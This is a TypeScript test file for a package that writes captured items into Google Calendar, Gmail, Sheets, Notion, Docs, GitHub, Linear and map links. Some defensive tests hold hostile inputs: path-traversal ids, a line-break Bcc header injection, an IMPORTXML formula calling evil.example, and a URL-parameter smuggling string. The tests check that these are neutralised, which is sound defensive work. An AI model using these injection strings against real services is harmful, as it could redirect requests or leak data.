import { describe, expect, it } from "vitest";
import { InMemoryEventLog, OutcomeUnknownError, commit, plan, propose, resolve, undo, type Candidate, type Receipt, type SemanticObject } from "@recast/core";
import { HttpBridge, DestinationError, rfc822Draft, webhookEvent, webhookPage, webhookNote, outlookCalendarEvent, outlookMessageDraft, msTodoTask, msTodoEntry, githubIssue, linearIssue, todoistTask, todoistEntry, googleCalendar, googleCalendarEvent, googleDocs, googleSheets, googleTasks, googleTasksEntry, gmailDraft, gmailMessageDraft, notion, REGISTRY, CONTRACTS, LinkBridge, googleMapsDirections, appleMapsDirections, linkFor, type LinkSpec, type HttpRequest, type HttpResponse, type Spec, type Transport } from "../src";

const NOW = () => "2026-10-01T10:00:00Z";
function obj(type: Candidate["type"], properties: Record<string, unknown>): SemanticObject {
  return resolve({
    type, properties, fields: Object.fromEntries(Object.keys(properties).map((k) => [k, { confidence: 0.95, evidence: [{ locator: { kind: "css", value: `#${k}` } }] }])),
    provenance: { source: { app: "test" }, capture: { method: "dom", adapter: "test", at: "2026-10-01T09:00:00Z" } },
  });
}
const meera = () => obj("Person", { name: "Meera Iyer", email: ["meera@example.com"] });

/** Records every request and answers like the real API would (shapes follow each API's reference docs). */
function fake(handler: (r: HttpRequest) => HttpResponse) { const calls: HttpRequest[] = []; const t: Transport = async (r) => { calls.push(r); return handler(r); }; return { calls, t }; }
const ok = (json: unknown = {}): HttpResponse => ({ status: 200, json });

/** The real core pipeline: propose -> plan -> commit -> (undo). Only the network is faked. */
async function place<T>(spec: Spec<T>, target: T, t: Transport, object: SemanticObject, relationId: string) {
  const bridge = new HttpBridge(spec, target, t); const log = new InMemoryEventLog();
  const p = propose(object, bridge.describe()).find((x) => x.relationId === relationId)!;
  expect(p.status).toBe("ready");
  const op = plan(p, { now: NOW });
  const receipt = await commit(op, { kind: "hold", heldMs: 700 }, { bridge, log, now: NOW });
  return { receipt, op, undo: () => undo(receipt, { bridge, log, now: NOW }), log, bridge };
}

describe("every contract passes the real schema and grammar checks", () => {
  for (const [name, spec] of Object.entries({ googleCalendar, googleCalendarEvent, outlookCalendarEvent, gmailDraft, gmailMessageDraft, googleSheets, googleTasks, googleTasksEntry, notion, googleDocs, githubIssue, linearIssue, todoistTask, todoistEntry, outlookMessageDraft, msTodoTask, msTodoEntry, webhookEvent, webhookPage, webhookNote })) {
    it(name, () => { expect(() => new HttpBridge(spec as Spec<unknown>, {}, async () => ok()).describe()).not.toThrow(); });
  }
});

// The abilities a contract declares are what the picker and the review promise. They must match what the bridge's
// operations declare about themselves, so a destination never offers an Undo or a check it cannot perform.
describe("declared abilities match what each bridge actually does", () => {
  for (const [name, spec] of Object.entries({ googleCalendar, googleCalendarEvent, outlookCalendarEvent, gmailDraft, gmailMessageDraft, googleSheets, googleTasks, googleTasksEntry, notion, googleDocs, githubIssue, linearIssue, todoistTask, todoistEntry, outlookMessageDraft, msTodoTask, msTodoEntry, webhookEvent, webhookPage, webhookNote })) {
    it(name, () => {
      const caps = spec.contract.accepts.map((row) => spec.capabilities[row.relationId]);
      expect(caps.every(Boolean), "every accepted row declares its operation").toBe(true);
      const has = (a: string) => spec.contract.abilities!.includes(a as never);
      expect(has("undo")).toBe(caps.some((c) => c!.reversal !== "none"));
      expect(has("verify")).toBe(caps.some((c) => c!.verifiable));
      // create: writes something new (whether or not it can be taken back); update: changes something that was there.
      expect(has("create")).toBe(caps.some((c) => c!.writes && c!.reversal !== "restore-previous"));
      expect(has("update")).toBe(caps.some((c) => c!.reversal === "restore-previous"));
      expect(has("open")).toBe(false);
    });
  }
  it("every destination in the registry declares its abilities", () => {
    for (const c of REGISTRY) expect(c.abilities?.length, c.destination).toBeGreaterThan(0);
  });
});

describe("Google Calendar", () => {
  const target = { calendarId: "primary", eventId: "ev 1" };
  const server = (event: Record<string, unknown>) => fake((r) => {
    if (r.method === "GET") return ok(event);
    Object.assign(event, r.body); return ok(event);
  });

  it("adds an attendee by sending the existing attendees plus the new one, with no invitation email", async () => {
    const event: Record<string, unknown> = { attendees: [{ email: "a@example.com" }] };
    const s = server(event);
    await place(googleCalendar, target, s.t, meera(), "person-event-attendee");
    expect(s.calls.map((c) => `${c.method} ${c.url}`)).toEqual([
      "GET https://www.googleapis.com/calendar/v3/calendars/primary/events/ev%201",
      "PATCH https://www.googleapis.com/calendar/v3/calendars/primary/events/ev%201?sendUpdates=none",
    ]);
    expect(event.attendees).toEqual([{ email: "a@example.com" }, { email: "meera@example.com", displayName: "Meera Iyer" }]);
  });

  it("undo restores exactly the attendees that were there before", async () => {
    const event: Record<string, unknown> = { attendees: [{ email: "a@example.com" }] };
    const r = await place(googleCalendar, target, server(event).t, meera(), "person-event-attendee");
    await r.undo(); expect(event.attendees).toEqual([{ email: "a@example.com" }]);
  });

  it("an attendee already on the event is not added twice, and undoing that no-op leaves the event alone", async () => {
    const event: Record<string, unknown> = { attendees: [{ email: "meera@example.com" }] }; const s = server(event);
    const r = await place(googleCalendar, target, s.t, meera(), "person-event-attendee");
    await r.undo();
    expect(s.calls.filter((c) => c.method === "PATCH")).toEqual([]);
    expect(event.attendees).toEqual([{ email: "meera@example.com" }]);
  });

  it("sets and restores the location", async () => {
    const event: Record<string, unknown> = { location: "Old room" };
    const r = await place(googleCalendar, target, server(event).t, obj("Location", { name: "Toit", address: "298 100 Feet Rd" }), "location-event-location");
    expect(event.location).toBe("Toit, 298 100 Feet Rd");
    await r.undo(); expect(event.location).toBe("Old room");
  });

  it("a hostile id cannot change which resource is addressed", async () => {
    const s = server({});
    await place(googleCalendar, { calendarId: "primary", eventId: "../../calendarList" }, s.t, meera(), "person-event-attendee");
    expect(s.calls[0]!.url).toBe("https://www.googleapis.com/calendar/v3/calendars/primary/events/..%2F..%2FcalendarList");
  });

  it("a failing destination fails the placement and nothing is recorded as done", async () => {
    const s = fake(() => ({ status: 403, json: {} }));
    const bridge = new HttpBridge(googleCalendar, target, s.t); const log = new InMemoryEventLog();
    const op = plan(propose(meera(), bridge.describe())[0]!, { now: NOW });
    await expect(commit(op, { kind: "hold", heldMs: 700 }, { bridge, log, now: NOW })).rejects.toThrow(/403/);
    expect((await log.entries()).map((e) => e.kind)).toEqual(["failed"]);
  });
});

describe("Gmail", () => {
  it("creates a draft, never a send, and undo deletes that draft", async () => {
    const s = fake((r) => (r.method === "POST" ? ok({ id: "d/1" }) : ok()));
    const r = await place(gmailDraft, {}, s.t, meera(), "person-message-recipient");
    expect(s.calls[0]).toMatchObject({ method: "POST", url: "https://gmail.googleapis.com/gmail/v1/users/me/drafts" });
    expect(s.calls[0]!.url).not.toMatch(/send/);
    const raw = (s.calls[0]!.body as { message: { raw: string } }).message.raw;
    expect(raw).toMatch(/^[A-Za-z0-9_-]+$/);                                     // base64url, as the API requires
    expect(atob(raw.replace(/-/g, "+").replace(/_/g, "/"))).toBe('To: meera@example.com\r\nContent-Type: text/plain; charset="UTF-8"\r\n\r\n');
    await r.undo(); expect(s.calls[1]).toMatchObject({ method: "DELETE", url: "https://gmail.googleapis.com/gmail/v1/users/me/drafts/d%2F1" });
  });

  it("a composed message is saved as a draft with its recipient and its text, and undo deletes it", async () => {
    const s = fake((r) => (r.method === "POST" ? ok({ id: "d2" }) : ok()));
    const msg = obj("Message", { to: ["maya.rao@example.com"], snippet: "Free for dinner this week?" });
    const r = await place(gmailMessageDraft, {}, s.t, msg, "message-draft-entry");
    expect(s.calls[0]).toMatchObject({ method: "POST", url: "https://gmail.googleapis.com/gmail/v1/users/me/drafts" });
    const raw = (s.calls[0]!.body as { message: { raw: string } }).message.raw;
    expect(atob(raw.replace(/-/g, "+").replace(/_/g, "/"))).toBe('To: maya.rao@example.com\r\nContent-Type: text/plain; charset="UTF-8"\r\n\r\nFree for dinner this week?');
    expect(r.receipt).toMatchObject({ relationId: "message-draft-entry", reversible: true });
    await r.undo(); expect(s.calls[1]).toMatchObject({ method: "DELETE", url: "https://gmail.googleapis.com/gmail/v1/users/me/drafts/d2" });
  });

  it("refuses a recipient containing a line break, so a page cannot slip in a Bcc header", () => {
    expect(() => rfc822Draft("a@example.com\r\nBcc: attacker@example.com")).toThrow(DestinationError);
    expect(() => rfc822Draft("a@example.com\nBcc: x")).toThrow(/line break/);
  });
});

describe("Google Sheets", () => {
  const target = { spreadsheetId: "sheet1", range: "Compare!A:B" };
  const product = (name: string) => obj("Product", { name, url: "https://shop.example/p/1" });

  it("appends a row as raw text and undo clears exactly that range", async () => {
    const s = fake((r) => (r.url.includes(":append") ? ok({ updates: { updatedRange: "Compare!A5:B5" } }) : ok()));
    const r = await place(googleSheets, target, s.t, product("Kettle"), "product-product-compare");
    expect(s.calls[0]).toMatchObject({ method: "POST", body: { values: [["Kettle", "https://shop.example/p/1"]] } });
    expect(s.calls[0]!.url).toBe("https://sheets.googleapis.com/v4/spreadsheets/sheet1/values/Compare!A%3AB:append?valueInputOption=RAW&insertDataOption=INSERT_ROWS");
    await r.undo(); expect(s.calls[1]!.url).toBe("https://sheets.googleapis.com/v4/spreadsheets/sheet1/values/Compare!A5%3AB5:clear");
  });

  it("never lets a product name become a spreadsheet formula (RAW, not USER_ENTERED)", async () => {
    const s = fake(() => ok({ updates: { updatedRange: "Compare!A6:B6" } }));
    await place(googleSheets, target, s.t, product('=IMPORTXML("https://evil.example","//x")'), "product-product-compare");
    expect(s.calls[0]!.url).toContain("valueInputOption=RAW"); expect(s.calls[0]!.url).not.toContain("USER_ENTERED");
  });

  it("a response without the written range is an error, not a silent success", async () => {
    await expect(place(googleSheets, target, fake(() => ok({})).t, product("Kettle"), "product-product-compare")).rejects.toThrow(/updatedRange/);
  });
});

describe("Google Tasks", () => {
  it("adds a task with the page address in the notes, and undo deletes it", async () => {
    const s = fake((r) => (r.method === "POST" ? ok({ id: "t1" }) : ok()));
    const r = await place(googleTasks, { taskListId: "@default" }, s.t, obj("Document", { title: "Read the spec", url: "https://example.com/spec" }), "document-task-reference");
    expect(s.calls[0]).toMatchObject({ method: "POST", url: "https://tasks.googleapis.com/tasks/v1/lists/%40default/tasks", body: { title: "Read the spec", notes: "https://example.com/spec" } });
    await r.undo(); expect(s.calls[1]).toMatchObject({ method: "DELETE", url: "https://tasks.googleapis.com/tasks/v1/lists/%40default/tasks/t1" });
  });
});

describe("Google Tasks: a whole task with a due date", () => {
  it("sends the title, the link as notes and the due day as midnight UTC (Google keeps only the date); undo deletes it", async () => {
    const s = fake((r) => (r.method === "POST" ? ok({ id: "t9" }) : ok()));
    const r = await place(googleTasksEntry, { taskListId: "@default" }, s.t, obj("Task", { title: "Q3 plan", url: "https://example.com/q3", due: "2026-10-23" }), "task-tasklist-entry");
    expect(s.calls[0]).toMatchObject({ method: "POST", url: "https://tasks.googleapis.com/tasks/v1/lists/%40default/tasks", body: { title: "Q3 plan", notes: "https://example.com/q3", due: "2026-10-23T00:00:00.000Z" } });
    await r.undo(); expect(s.calls[1]).toMatchObject({ method: "DELETE", url: "https://tasks.googleapis.com/tasks/v1/lists/%40default/tasks/t9" });
  });
  it("a task without a due date or a link is just its title", async () => {
    const s = fake(() => ok({ id: "t1" }));
    await place(googleTasksEntry, { taskListId: "@default" }, s.t, obj("Task", { title: "Call the bank" }), "task-tasklist-entry");
    expect(s.calls[0]!.body).toEqual({ title: "Call the bank" });
  });
});

describe("Notion", () => {
  it("creates a page in the chosen database with the version header, and undo archives it", async () => {
    const s = fake((r) => (r.method === "POST" ? ok({ id: "page-1" }) : ok()));
    const r = await place(notion, { databaseId: "db1" }, s.t, obj("Document", { title: "Read the spec", url: "https://example.com/spec" }), "document-project-source");
    expect(s.calls[0]).toMatchObject({ method: "POST", url: "https://api.notion.com/v1/pages", headers: { "Notion-Version": "2022-06-28" } });
    expect(s.calls[0]!.body).toEqual({ parent: { database_id: "db1" }, properties: { Name: { title: [{ text: { content: "Read the spec" } }] }, URL: { url: "https://example.com/spec" } } });
    await r.undo(); expect(s.calls[1]).toMatchObject({ method: "PATCH", url: "https://api.notion.com/v1/pages/page-1", body: { archived: true } });
  });

  it("uses the database's own title and URL property names when given", async () => {
    const s = fake(() => ok({ id: "p" }));
    await place(notion, { databaseId: "db1", titleProperty: "Title", urlProperty: "Link" }, s.t, obj("Document", { title: "X", url: "https://e.com/" }), "document-project-source");
    expect(Object.keys((s.calls[0]!.body as { properties: object }).properties)).toEqual(["Title", "Link"]);
  });

  it("reads the page back from Notion: title and link, with the page's own address; an archived page is not there (D51)", async () => {
    let page: Record<string, unknown> = {};
    const s = fake((r) => { if (r.method === "POST") { const b = r.body as any; page = { id: "page-1", url: "https://www.notion.so/Read-the-spec-page1", archived: false, properties: { Name: { title: [{ plain_text: b.properties.Name.title[0].text.content }] }, URL: { url: b.properties.URL?.url ?? null } } }; return ok(page); } return r.method === "GET" ? ok(page) : ok(); });
    const r = await place(notion, { databaseId: "db1" }, s.t, obj("Document", { title: "Read the spec", url: "https://example.com/spec" }), "document-project-source");
    const v = await r.bridge.verify!(r.receipt, r.op);
    expect(v).toMatchObject({ ok: true, link: "https://www.notion.so/Read-the-spec-page1", fields: [{ path: "Document.title", actual: "Read the spec", match: true }, { path: "Document.url", actual: "https://example.com/spec", match: true }] });
    page = { ...page, archived: true };
    expect(await r.bridge.verify!(r.receipt, r.op)).toMatchObject({ ok: false, note: "the page is not in Notion" });
  });

  it("a database without a link column gets the link in the page's text, and the title is what is read back", async () => {
    let page: Record<string, unknown> = {};
    const s = fake((r) => { if (r.method === "POST") { page = { id: "p2", archived: false, properties: { Name: { title: [{ plain_text: "X" }] } } }; return ok(page); } return ok(page); });
    const r = await place(notion, { databaseId: "db1", urlProperty: false }, s.t, obj("Document", { title: "X", url: "https://e.com/" }), "document-project-source");
    expect(s.calls[0]!.body).toMatchObject({ properties: { Name: {} }, children: [{ type: "paragraph", paragraph: { rich_text: [{ text: { content: "https://e.com/", link: { url: "https://e.com/" } } }] } }] });
    expect(Object.keys((s.calls[0]!.body as any).properties)).toEqual(["Name"]);
    expect(await r.bridge.verify!(r.receipt, r.op)).toMatchObject({ ok: true, fields: [{ path: "Document.title", match: true }] });
  });
});

describe("shared behaviour", () => {
  it("undo without a stored reference fails loudly", async () => {
    const b = new HttpBridge(googleTasks, { taskListId: "x" }, async () => ok());
    await expect(b.undo({ receiptId: "r", opId: "o", at: NOW(), status: "done", objectId: "x", destination: "google-tasks.list", relationId: "document-task-reference", effect: "Add a task", reversible: true } as Receipt)).rejects.toThrow(/no reference/);
  });
  it("nothing in this package reaches for the network on its own", async () => {
    const { readFileSync, readdirSync } = await import("node:fs");
    const src = readdirSync(new URL("../src/", import.meta.url)).map((f) => readFileSync(new URL(`../src/${f}`, import.meta.url), "utf8")).join("\n");
    expect(src).not.toMatch(/\bfetch\s*\(|XMLHttpRequest|WebSocket/);
  });
});

describe("the registry", () => {
  it("lists every bridge's contract once, and each spec performs exactly the contract it lists", () => {
    expect(REGISTRY.map((c) => c.destination).sort()).toEqual(["apple-maps.directions", "github.issues", "gmail.compose-draft", "gmail.drafts", "google-calendar.calendar", "google-calendar.event-editor", "google-docs.new-document", "google-maps.directions", "google-sheets.range", "google-tasks.list", "google-tasks.tasklist", "linear.issues", "microsoft-todo.list", "microsoft-todo.task", "notion.database", "outlook-calendar.calendar", "outlook-mail.drafts", "todoist.inbox", "todoist.task", "webhook.event", "webhook.note", "webhook.page"]);
    expect(todoistTask.contract).toBe(CONTRACTS.todoistTask); expect(todoistEntry.contract).toBe(CONTRACTS.todoistEntry);
    expect(outlookCalendarEvent.contract).toBe(CONTRACTS.outlookCalendarEvent);
    expect(gmailMessageDraft.contract).toBe(CONTRACTS.gmailMessageDraft);
    expect(googleTasks.contract).toBe(CONTRACTS.googleTasks);
    expect(googleTasksEntry.contract).toBe(CONTRACTS.googleTasksEntry);
  });
});

describe("open-and-prefill links (Google Maps, Apple Maps)", () => {
  const place = (props: Record<string, unknown>) => obj("Location", props);
  async function open(spec: LinkSpec, location: SemanticObject) {
    const opened: string[] = [];
    const bridge = new LinkBridge(spec, (u) => opened.push(u)); const log = new InMemoryEventLog();
    const p = propose(location, bridge.describe())[0]!;
    const op = plan(p, { now: NOW });
    const receipt = await commit(op, { kind: "release" }, { bridge, log, now: NOW });
    return { p, op, receipt, opened, bridge, log };
  }
  it("opens Google Maps with directions to the name and address the review showed, and nothing else", async () => {
    const { p, receipt, opened } = await open(googleMapsDirections, place({ name: "Dakshin", address: "12 MG Road, Bengaluru" }));
    expect(p).toMatchObject({ status: "ready", reversible: false, risk: { tier: "low", consent: "release" } });
    expect(opened).toEqual(["https://www.google.com/maps/dir/?api=1&destination=Dakshin%2C%2012%20MG%20Road%2C%20Bengaluru"]);
    expect(receipt).toMatchObject({ reversible: false, bridgeRef: opened[0] });
  });
  it("Apple Maps takes the same place", async () => {
    const { opened } = await open(appleMapsDirections, place({ name: "Dakshin" }));
    expect(opened).toEqual(["https://maps.apple.com/?daddr=Dakshin"]);
  });
  it("a place's text can never change the host or add parameters", async () => {
    const { opened } = await open(googleMapsDirections, place({ name: "x&api=0#@evil.example/?q=1" }));
    const u = new URL(opened[0]!);
    expect(u.host).toBe("www.google.com");
    expect([...u.searchParams.keys()]).toEqual(["api", "destination"]);
    expect(u.searchParams.get("destination")).toBe("x&api=0#@evil.example/?q=1");
  });
  it("declares it writes nothing and offers no Undo", async () => {
    const { receipt, bridge, log } = await open(googleMapsDirections, place({ name: "Dakshin" }));
    expect(bridge.capabilities()).toMatchObject({ writes: false, reversal: "none", verifiable: false });
    await expect(undo(receipt, { bridge, log, now: NOW })).rejects.toThrow(/cannot be undone/);
    expect(linkFor("google-maps.directions")).toBe(googleMapsDirections);
    expect(linkFor("google-calendar.calendar")).toBeUndefined();
  });
});

describe("Google Docs: a note becomes a new document", () => {
  const note = () => obj("Note", { title: "Design reading", body: "“Make the common case fast.”\n— Notes, https://b.example/notes", sources: ["https://b.example/notes"] });
  const server = (fail?: { batch?: number }) => fake((r) => {
    if (r.method === "POST" && r.url === "https://docs.googleapis.com/v1/documents") return ok({ documentId: "doc 1", title: (r.body as { title: string }).title });
    if (r.url.endsWith(":batchUpdate")) return fail?.batch ? { status: fail.batch, json: {} } : ok({ replies: [{}] });
    if (r.method === "PATCH" && r.url.startsWith("https://www.googleapis.com/drive/v3/files/")) return ok({ trashed: true });
    return { status: 404, json: {} };
  });
  it("creates the document with the reviewed title, then inserts the reviewed text as plain text; Undo moves it to the trash", async () => {
    const { calls, t } = server();
    const { receipt, undo: u } = await place(googleDocs, {}, t, note(), "note-docs-entry");
    expect(calls.map((c) => `${c.method} ${c.url}`)).toEqual(["POST https://docs.googleapis.com/v1/documents", "POST https://docs.googleapis.com/v1/documents/doc%201:batchUpdate"]);
    expect(calls[0]!.body).toEqual({ title: "Design reading" });
    expect(calls[1]!.body).toEqual({ requests: [{ insertText: { location: { index: 1 }, text: "“Make the common case fast.”\n— Notes, https://b.example/notes" } }] });
    expect(JSON.parse(receipt.bridgeRef!)).toEqual({ id: "doc 1" });
    await u();
    expect(calls.at(-1)).toMatchObject({ method: "PATCH", url: "https://www.googleapis.com/drive/v3/files/doc%201", body: { trashed: true } });
  });
  it("if the text cannot be added, the empty document is trashed and the placement fails: nothing half-made is left", async () => {
    const { calls, t } = server({ batch: 400 });
    await expect(place(googleDocs, {}, t, note(), "note-docs-entry")).rejects.toThrow(/answered 400/);
    expect(calls.at(-1)).toMatchObject({ method: "PATCH", body: { trashed: true } });
  });
  it("a lost answer while adding the text is unknown, with the document's id kept, and is never resent", async () => {
    const { calls, t } = server({ batch: 504 });
    await expect(place(googleDocs, {}, t, note(), "note-docs-entry")).rejects.toBeInstanceOf(OutcomeUnknownError);
    expect(calls.filter((c) => c.url.endsWith(":batchUpdate"))).toHaveLength(1);
    expect(calls.some((c) => c.method === "PATCH")).toBe(false);
  });
});

describe("GitHub: an issue opened in one repository", () => {
  const issue = () => obj("Issue", { title: "Sign-in crash", body: "Captured with Recast.\n\n**Error**\n```text\nTypeError: x\n```", sources: ["https://ci.example/run/42"] });
  it("opens the issue with the reviewed title and body; asks for a confirm (watchers may be notified); Undo closes it as not planned", async () => {
    const { calls, t } = fake((r) => r.method === "POST" ? ok({ number: 7, html_url: "https://github.com/acme/app/issues/7" }) : ok({ state: "closed" }));
    const p = propose(issue(), CONTRACTS.githubIssue)[0]!;
    expect(p.risk).toMatchObject({ tier: "medium", consent: "confirm" });
    const { receipt, undo: u } = await place(githubIssue, { owner: "acme", repo: "app" }, t, issue(), "issue-tracker-entry");
    expect(calls[0]).toMatchObject({ method: "POST", url: "https://api.github.com/repos/acme/app/issues", headers: { Accept: "application/vnd.github+json" }, body: { title: "Sign-in crash", body: "Captured with Recast.\n\n**Error**\n```text\nTypeError: x\n```" } });
    expect(JSON.parse(receipt.bridgeRef!)).toEqual({ number: 7, url: "https://github.com/acme/app/issues/7" });
    await u();
    expect(calls.at(-1)).toMatchObject({ method: "PATCH", url: "https://api.github.com/repos/acme/app/issues/7", body: { state: "closed", state_reason: "not_planned" } });
  });
  it("a repository name cannot change which resource the request reaches", async () => {
    const { calls, t } = fake(() => ok({ number: 1 }));
    await place(githubIssue, { owner: "acme", repo: "app/../../orgs/x" }, t, issue(), "issue-tracker-entry");
    expect(calls[0]!.url).toBe("https://api.github.com/repos/acme/app%2F..%2F..%2Forgs%2Fx/issues");
  });
});

describe("Linear: the same issue on one team (GraphQL)", () => {
  const issue = () => obj("Issue", { title: "Sign-in crash", body: "**Error**\n```text\nTypeError: x\n```" });
  it("creates it with values as variables (never in the query text); Undo deletes it", async () => {
    const { calls, t } = fake((r) => {
      const q = String((r.body as { query: string }).query);
      return q.includes("issueCreate") ? ok({ data: { issueCreate: { success: true, issue: { id: "lin-1", identifier: "ENG-7", url: "https://linear.app/x/issue/ENG-7" } } } }) : ok({ data: { issueDelete: { success: true } } });
    });
    const { receipt, undo: u } = await place(linearIssue, { teamId: "team-1" }, t, issue(), "issue-tracker-entry");
    expect(calls[0]).toMatchObject({ method: "POST", url: "https://api.linear.app/graphql", body: { variables: { input: { teamId: "team-1", title: "Sign-in crash", description: "**Error**\n```text\nTypeError: x\n```" } } } });
    expect(String((calls[0]!.body as { query: string }).query)).not.toContain("Sign-in crash");
    expect(JSON.parse(receipt.bridgeRef!)).toEqual({ id: "lin-1", identifier: "ENG-7" });
    await u();
    expect(calls[1]!.body).toMatchObject({ variables: { id: "lin-1" } });
  });
  it("a GraphQL error in a 200 answer is a failure, not a success", async () => {
    const { t } = fake(() => ok({ errors: [{ message: "Entity not found: Team" }] }));
    await expect(place(linearIssue, { teamId: "nope" }, t, issue(), "issue-tracker-entry")).rejects.toThrow(/Linear refused it: Entity not found: Team/);
  });
});
